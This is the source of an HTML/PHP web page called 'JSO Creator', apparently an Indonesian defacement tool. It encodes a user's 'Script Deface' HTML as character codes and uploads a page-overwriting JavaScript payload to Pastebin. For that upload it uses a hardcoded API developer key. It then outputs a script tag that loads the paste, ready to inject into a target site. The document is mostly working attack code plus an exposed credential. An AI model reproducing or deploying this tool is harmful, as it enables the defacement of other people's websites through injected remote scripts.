<!DOCTYPE html>
<html>
<head>
<title>JSO Creator by Iron Six</title>
<meta name="description" content="JSO Creator" />
<meta http-equiv="Content-Type" content="text/html;charset=gb2312" />
<!-- dummy.machine.os@gmail.com -->
<!-- SXJmYW5hdG9yIE9keXNzZXkK -->
<style type="text/css">
body {
background-color: #f2f3f4;
color: #000;
font-family: terminus, monospace;
font-size: 18px;
width: 800px;
max-width: 800px;
margin: 0 auto;
border: 1px solid #ccc;
}
textarea {
width: 180px;
height: 90px;
}
</style>
<script>
    function runCharCodeAt() {
        input = document.charCodeAt.input.value;
        output = "";
        for(i=0; i<input.length; ++i) {
            if (output != "") output += ", ";
            output += input.charCodeAt(i);
        }
        document.charCodeAt.output.value = output;
    }
</script>
</head>
<body>
<center>
    <h1>JSO Creator</h1>
    <form name="charCodeAt" method="post">
        <textarea name="input" placeholder="Script Deface"></textarea><br><br>
        <input type="button" onclick="runCharCodeAt()" value="Convert"><br><br>
        <textarea name="output" placeholder="Hasil Convert"></textarea><br><br>
        <input type="submit" name="submit" value="Pastebin">
    </form>
    <br><br>
<?php
 
if (isset($_POST['submit'])) {
    if (empty($_POST['output'])) {
        echo "<script>alert('Convert dulu cok!!');</script>";
    } else {
$isi = $_POST['output'];
$random = rand(1, 99999999);
$api_dev_key            = '633fcbdacbff82bfd5dd821a9f8921f7'; // your api_developer_key
$api_paste_code         = "document.documentElement.innerHTML=String.fromCharCode(".$isi.")"; // your paste text
$api_paste_private      = '0'; // 0=public 1=unlisted 2=private
$api_paste_name         = $random; // name or title of your paste
$api_paste_expire_date      = 'N';
$api_paste_format       = 'text';
$api_user_key           = ''; // if an invalid or expired api_user_key is used, an error will spawn. If no api_user_key is used, a guest paste will be created
$api_paste_name         = urlencode($api_paste_name);
$api_paste_code         = urlencode($api_paste_code);
 
$url                = 'https://pastebin.com/api/api_post.php';
$ch                 = curl_init($url);
 
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'api_option=paste&api_user_key='.$api_user_key.'&api_paste_private='.$api_paste_private.'&api_paste_name='.$api_paste_name.'&api_paste_expire_date='.$api_paste_expire_date.'&api_paste_format='.$api_paste_format.'&api_dev_key='.$api_dev_key.'&api_paste_code='.$api_paste_code.'');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_VERBOSE, 1);
curl_setopt($ch, CURLOPT_NOBODY, 0);
 
$response           = curl_exec($ch);
$hasil = str_replace('https://pastebin.com', 'https://pastebin.com/raw', $response);
$asu = '<script type="text/javascript" src="'.$hasil.'"></script>';
$kk = htmlspecialchars($asu);
echo "<br><textarea>". $kk ."</textarea>";
}
}
 
 ?>
<hr>
<!-- santuy wh -->
&#169; 2019 Iron Six<br>
<small>The Next Level</small>
 </center>
</body>
</html>
